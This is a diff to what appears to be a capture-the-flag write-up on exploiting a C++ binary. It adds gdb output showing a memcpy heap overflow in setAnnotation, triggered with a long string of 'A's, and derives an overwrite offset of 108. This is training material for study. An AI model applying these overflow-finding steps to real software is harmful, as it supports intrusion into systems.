@@ -44,7 +44,7 @@ with an
 0x0804874e  N::operator-(N&)
 [...]
 ```
-We can see the class is composed with a *__constructor__* *(constructor has same name as Class)* and three methods <br> *__setAnnotation(char \*)__*, *__operator+(N&))__* and *__operator-(N&)__* <br>
+We can see the class is composed with a *__constructor__* *(constructor has same name as Class)* and three methods <br> *__setAnnotation(char \*)__*, *__operator+(N&)__* and *__operator-(N&)__* <br>
 We we disassembly the *setAnnotation()* function we will find some interesting things *(a call to memcpy() which we can use to overflow the heap)*
 ```
 (gdb) disas _ZN1N13setAnnotationEPc
@@ -64,3 +64,36 @@ We we disassembly the *setAnnotation()* function we will find some interesting t
    0x08048738 <+42>:	leave
    0x08048739 <+43>:	ret
 ```
+So the argument we pass to the prgram is being passed as argument to *setAnnotation(argv[1])* you can check it by
+```
+r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+(gdb) b  *0x08048670
+Breakpoint 1 at 0x8048670
+n
+=> 0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
+(gdb) x/s $eax
+0xbffff85c:	 'A' <repeats 110 times>
+ni
+ni
+ni
+(gdb) i r
+eax            0x804a00c	134520844
+ecx            0x4141	16705                    <-------------------------
+edx            0x804a07a	134520954
+ebx            0x804a078	134520952
+esp            0xbffff650	0xbffff650
+ebp            0xbffff678	0xbffff678
+esi            0x0	0
+edi            0x0	0
+eip            0x804867c	0x804867c <main+136>
+eflags         0x200283	[ CF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+```
+As we can see after passing 110 characters we overwrote by two bytes `ecx` what gives us an **__offset_** of `108` 
